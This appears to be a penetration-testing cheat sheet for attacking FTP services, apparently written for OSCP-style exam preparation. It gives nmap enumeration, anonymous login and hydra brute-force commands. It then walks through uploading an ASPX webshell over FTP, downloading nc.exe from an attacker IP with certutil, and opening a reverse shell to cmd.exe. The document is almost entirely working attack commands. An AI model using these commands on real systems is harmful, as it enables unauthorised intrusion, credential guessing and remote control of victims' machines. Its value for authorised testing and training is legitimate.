## Enumeration
### nmap 
```bash
sudo nmap -sV -p21 -sC -A 10.10.10.10
```

### anonymous login 
```bash
ftp <IP>
>anonymous
>anonymous
>ls -a   # List all files (even hidden) (yes, they could be hidden)
>binary  # Set transmission to binary instead of ascii
>ascii   # Set transmission to ascii instead of binary
>get file.txt  # download file
>put rev.aspx  # upload file 
>bye     # exit

# download all files
wget -m --no-passive ftp://anonymous:anonymous@IP
```

### bruteforce FTP login 
```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://IP
hydra -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <IP> ftp
```
<br>

## FTP Attacks 
### webshell IIS
```bash
put cmd.aspx   # upload aspx webshell through FTP
http://ms01.oscp.exam:8000/cmd.aspx    # browse to webshell
certutil -urlcache -f http://192.168.45.210/nc.exe -o C:\Windows\Temp  # download nc.exe 
nc -lvnp 443  
.\nc.exe 192.168.45.201 443 -e cmd.exe
```
![image](https://github.com/GwenBSec/Pentest-Book/assets/88676386/0b36aac9-3e1e-4840-a7eb-adb50a5f3ef1)



